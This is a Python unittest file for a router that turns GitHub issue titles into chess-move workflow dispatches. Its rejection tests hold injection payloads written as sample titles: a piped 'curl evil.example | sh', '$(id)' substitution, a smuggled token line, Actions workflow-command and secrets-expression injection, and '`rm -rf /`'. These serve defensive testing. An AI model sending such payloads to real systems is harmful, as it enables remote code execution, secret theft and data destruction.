#!/usr/bin/env python3
"""Tests for the move router.

WHY THIS EXISTS. `route.py` is the one thing between a title anyone can type
and a token that starts a workflow in another repository. Every way a title
can be wrong has to end in a reply and a closed issue, and every way the
table can be wrong has to stop the run, so both are pinned here: the moves
that go through, the titles that never do, and the rows the table refuses.

Nothing here reads or writes outside a throwaway folder. Run it from the root
of the repository:

    python3 -m unittest discover -s intake -p 'test_*.py'
"""

from __future__ import annotations

import contextlib
import io
import json
import os
import pathlib
import shutil
import tempfile
import unittest
from unittest import mock

import route

ROW = {
    'repository': 'tannergolden/tannergolden',
    'workflow': 'chess.yml',
    'ref': 'Development',
    'pattern': ('(?P<uci>[a-h][1-8][a-h][1-8][qrbn]?) · game (?P<game>[1-9][0-9]{0,3})'
                ' · move (?P<move_number>[1-9][0-9]{0,2})'),
}
PLAYER = {'player': 'octocat', 'player_id': '583231', 'issue': '7', 'owner': 'tannergolden'}


class Folder:
    """A throwaway folder for tables and run files."""

    def __init__(self) -> None:
        self.root = pathlib.Path(tempfile.mkdtemp(prefix='route-test-'))

    def table(self, table: object) -> pathlib.Path:
        path = self.root / 'routes.json'
        path.write_text(json.dumps(table), encoding='utf-8')
        return path

    def cleanup(self) -> None:
        shutil.rmtree(self.root, ignore_errors=True)


class RouteTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.folder = Folder()
        self.addCleanup(self.folder.cleanup)
        self.routes = route.load(self.folder.table({'chess': ROW}))

    def decide(self, title: str, **who: str) -> dict:
        return route.route(title, **{**PLAYER, **who}, routes=self.routes)


class DispatchTests(RouteTestCase):
    def test_a_move_goes_to_its_game(self) -> None:
        decision = self.decide('chess: e2e4 · game 1 · move 1')
        self.assertEqual(decision['action'], 'dispatch')
        self.assertEqual(
            (decision['owner'], decision['repo'], decision['workflow']),
            ('tannergolden', 'tannergolden', 'chess.yml'),
        )
        self.assertEqual(decision['body'], {
            'ref': 'Development',
            'inputs': {
                'uci': 'e2e4', 'game': '1', 'move_number': '1',
                'issue': '7', 'player': 'octocat', 'player_id': '583231',
            },
        })

    def test_a_promotion_carries_its_piece(self) -> None:
        decision = self.decide('chess: e7e8q · game 12 · move 41')
        self.assertEqual(decision['body']['inputs']['uci'], 'e7e8q')
        self.assertEqual(decision['body']['inputs']['game'], '12')
        self.assertEqual(decision['body']['inputs']['move_number'], '41')

    def test_space_around_the_title_is_ignored(self) -> None:
        self.assertEqual(self.decide('  chess: g1f3 · game 3 · move 2 ')['action'], 'dispatch')

    def test_the_owner_plays_through_the_same_door(self) -> None:
        decision = self.decide('chess: e7e5 · game 1 · move 1', player='tannergolden')
        self.assertEqual(decision['action'], 'dispatch')
        self.assertEqual(decision['body']['inputs']['player'], 'tannergolden')

    def test_an_optional_group_that_did_not_match_is_empty(self) -> None:
        routes = route.load(self.folder.table({'chess': {**ROW, 'pattern': '(?P<a>[a-h])(?P<b>[1-8])?'}}))
        decision = route.route('chess: e', **PLAYER, routes=routes)
        self.assertEqual(decision['body']['inputs']['b'], '')


class RejectTests(RouteTestCase):
    TITLES = (
        '',
        'hello',
        'chess',
        'chess:',
        'chess: ',
        'chess:e2e4 · game 1 · move 1',
        'Chess: e2e4 · game 1 · move 1',
        'chess: e2e4',
        'chess: e2e9 · game 1 · move 1',
        'chess: e2e4k · game 1 · move 1',
        'chess: e2e4 · game 0 · move 1',
        'chess: e2e4 · game 1 · move 0',
        'chess: e2e4 · game 01 · move 1',
        'chess: e2e4 · game 1 · move 1000',
        'chess: e2e4 · game 1 · move 1 · and more',
        'chess: e2e4 . game 1 . move 1',
        'checkers: e2e4 · game 1 · move 1',
        'chess-960: e2e4 · game 1 · move 1',
    )
    # Each of these is a move with something riding on it.
    ATTACKS = (
        'chess: e2e4 · game 1 · move 1`; curl evil.example | sh`',
        'chess: e2e4$(id) · game 1 · move 1',
        'chess: e2e4 · game 1 · move 1\nGITHUB_TOKEN=stolen',
        'chess: e2e4 · game 1 · move 1\n::add-mask::x',
        'chess: e2e4 · game ${{ secrets.PLAY_APP_PRIVATE_KEY }} · move 1',
        'chess: e2e4 · game 1 · move 1\r\naction=dispatch',
        'chess: e2e4 · game ١ · move 1',
        '::stop-commands::x',
        '__proto__: e2e4 · game 1 · move 1',
    )

    def test_anything_but_a_move_is_turned_away(self) -> None:
        for title in self.TITLES + self.ATTACKS:
            with self.subTest(title=title):
                self.assertEqual(self.decide(title), {'action': 'reject'})

    def test_the_owner_keeps_their_own_issues(self) -> None:
        for title in ('The board did not redraw', 'chess: the board did not redraw', ''):
            with self.subTest(title=title):
                self.assertEqual(self.decide(title, player='TannerGolden'), {'action': 'ignore'})

    def test_a_loose_pattern_still_passes_only_tokens(self) -> None:
        routes = route.load(self.folder.table({'chess': {**ROW, 'pattern': '(?P<move>.+)'}}))
        for title, action in (
            ('chess: e2e4', 'dispatch'),
            ('chess: O-O+', 'dispatch'),
            ('chess: e2e4 and a sentence', 'reject'),
            ('chess: `id`', 'reject'),
            ('chess: @everyone', 'reject'),
            ('chess: ' + 'a' * 65, 'reject'),
        ):
            with self.subTest(title=title):
                self.assertEqual(route.route(title, **PLAYER, routes=routes)['action'], action)


class TableTests(unittest.TestCase):
    def setUp(self) -> None:
        self.folder = Folder()
        self.addCleanup(self.folder.cleanup)

    def refused(self, table: object, says: str) -> None:
        with self.assertRaises(route.TableError) as caught:
            route.load(self.folder.table(table))
        self.assertIn(says, str(caught.exception))

    def test_the_shipped_table_loads(self) -> None:
        routes = route.load()
        self.assertIn('chess', routes)
        self.assertEqual(routes['chess']['workflow'], 'chess.yml')

    def test_the_shipped_chess_pattern_reaches_every_game_and_move(self) -> None:
        # A game can run past 17,000 moves before the seventy-five-move rule and fivefold repetition must end it,
        # and the game takes up to nine digits for each: a move link for any of them is dispatched.
        routes = route.load()
        for game, move in ((1, 1), (1, 999), (1, 1000), (1, 17697), (10000, 1), (999999999, 999999999)):
            with self.subTest(game=game, move=move):
                decision = route.route(f'chess: e7e8q · game {game} · move {move}', player='octocat',
                                       player_id='583231', issue='7', owner='tannergolden', routes=routes)
                self.assertEqual(decision['action'], 'dispatch')
                self.assertEqual(decision['body']['inputs']['game'], str(game))
                self.assertEqual(decision['body']['inputs']['move_number'], str(move))
        too_long = route.route('chess: e2e4 · game 1 · move 1000000000', player='octocat', player_id='583231',
                               issue='7', owner='tannergolden', routes=routes)
        self.assertEqual(too_long['action'], 'reject')

    def test_the_description_is_not_a_game(self) -> None:
        routes = route.load(self.folder.table({'//': 'what this is', 'chess': ROW}))
        self.assertEqual(list(routes), ['chess'])

    def test_a_table_with_no_game_is_refused(self) -> None:
        self.refused({'//': 'nothing yet'}, 'names no game')
        self.refused([], 'one object')

    def test_a_table_that_is_not_json_is_refused(self) -> None:
        path = self.folder.root / 'routes.json'
        path.write_text('{"chess": ', encoding='utf-8')
        with self.assertRaises(route.TableError):
            route.load(path)

    def test_bad_rows_are_refused(self) -> None:
        for change, says in (
            ({'repository': 'tannergolden'}, 'owner/repository'),
            ({'repository': 'tannergolden/..'}, 'owner/repository'),
            ({'repository': 'tanner golden/x'}, 'owner/repository'),
            ({'workflow': 'chess.sh'}, 'workflow file name'),
            ({'workflow': '../chess.yml'}, 'workflow file name'),
            ({'ref': 'main..x'}, 'branch or a tag'),
            ({'ref': ''}, 'branch or a tag'),
            ({'pattern': '(?P<uci>[a-h'}, 'does not compile'),
            ({'pattern': '[a-h][1-8]'}, 'names no group'),
            ({'pattern': '(?P<Uci>[a-h])'}, 'cannot be a workflow input'),
            ({'pattern': '(?P<player>[a-z]+)'}, 'fills itself'),
            ({'pattern': '(?P<issue>[0-9]+)'}, 'fills itself'),
            ({'ref': 1}, 'every value is a string'),
        ):
            with self.subTest(change=change):
                self.refused({'chess': {**ROW, **change}}, says)

    def test_a_row_needs_exactly_its_keys(self) -> None:
        self.refused({'chess': {**ROW, 'extra': 'x'}}, 'exactly')
        row = dict(ROW)
        del row['ref']
        self.refused({'chess': row}, 'exactly')
        self.refused({'chess': 'tannergolden/tannergolden'}, 'exactly')

    def test_a_game_name_is_checked(self) -> None:
        self.refused({'Chess': ROW}, 'lower case')
        self.refused({'chess game': ROW}, 'lower case')


class MainTests(unittest.TestCase):
    """The script as the workflow runs it: environment in, three files out."""

    def setUp(self) -> None:
        self.folder = Folder()
        self.addCleanup(self.folder.cleanup)
        self.output = self.folder.root / 'output'
        self.output.write_text('', encoding='utf-8')

    def run_main(self, title: str, **env: str) -> tuple[int, str]:
        environment = {
            'GITHUB_REPOSITORY_OWNER': 'tannergolden',
            'GITHUB_OUTPUT': str(self.output),
            'RUNNER_TEMP': str(self.folder.root),
            'TITLE': title,
            'ISSUE': '7',
            'PLAYER': 'octocat',
            'PLAYER_ID': '583231',
            **env,
        }
        printed = io.StringIO()
        with mock.patch.dict(os.environ, environment, clear=True), contextlib.redirect_stdout(printed):
            code = route.main()
        return code, printed.getvalue()

    def outputs(self) -> dict[str, str]:
        lines = self.output.read_text(encoding='utf-8').splitlines()
        return dict(line.split('=', 1) for line in lines)

    def written(self, name: str) -> pathlib.Path:
        return self.folder.root / name

    def test_a_move_writes_its_dispatch_and_reply(self) -> None:
        code, printed = self.run_main('chess: e2e4 · game 1 · move 1')
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {
            'action': 'dispatch', 'game': 'chess', 'owner': 'tannergolden', 'repo': 'tannergolden',
            'workflow': 'chess.yml',
        })
        body = json.loads(self.written('dispatch.json').read_text(encoding='utf-8'))
        self.assertEqual(body['ref'], 'Development')
        self.assertEqual(body['inputs']['uci'], 'e2e4')
        reply = self.written('reply.md').read_text(encoding='utf-8')
        self.assertEqual(reply, "🚀 **Move received.** It's on its way to the chess board on [@tannergolden's"
                                " profile](https://github.com/tannergolden).\nThe Arbiter rules on it here within a"
                                " few minutes, and says why if it can't be played.\n")
        self.assertEqual(printed, 'Issue #7 by @octocat: dispatch to tannergolden/tannergolden, chess.yml.\n')

    def test_a_rejected_title_is_never_echoed(self) -> None:
        title = 'chess: `rm -rf /` · game 1 · move 1'
        code, printed = self.run_main(title)
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {'action': 'reject'})
        self.assertFalse(self.written('dispatch.json').exists())
        reply = self.written('reply.md').read_text(encoding='utf-8')
        self.assertTrue(reply.startswith("👋 **This isn't a move, so it's closed.**\nThis repository only takes moves"))
        self.assertIn('without changing the title', reply)
        self.assertNotIn('rm -rf', reply + printed)

    def test_the_owners_own_issue_writes_nothing_to_post(self) -> None:
        code, _ = self.run_main('A note to myself', PLAYER='tannergolden', PLAYER_ID='24684994')
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {'action': 'ignore'})
        self.assertFalse(self.written('reply.md').exists())

    def test_a_malformed_issue_stops_the_run(self) -> None:
        for env in ({'ISSUE': ''}, {'ISSUE': '7; echo'}, {'PLAYER': 'bot[bot]'}, {'PLAYER_ID': '0'},
                    {'GITHUB_REPOSITORY_OWNER': ''}):
            with self.subTest(env=env):
                code, printed = self.run_main('chess: e2e4 · game 1 · move 1', **env)
                self.assertEqual(code, 1)
                self.assertIn('::error::', printed)
                self.assertEqual(self.output.read_text(encoding='utf-8'), '')

    def test_a_broken_table_stops_the_run(self) -> None:
        broken = self.folder.table({'chess': {**ROW, 'workflow': 'chess'}})
        with mock.patch.object(route, 'ROUTES', broken):
            code, printed = self.run_main('chess: e2e4 · game 1 · move 1')
        self.assertEqual(code, 1)
        self.assertIn('::error file=intake/routes.json::', printed)
        self.assertEqual(self.output.read_text(encoding='utf-8'), '')


if __name__ == '__main__':
    unittest.main()
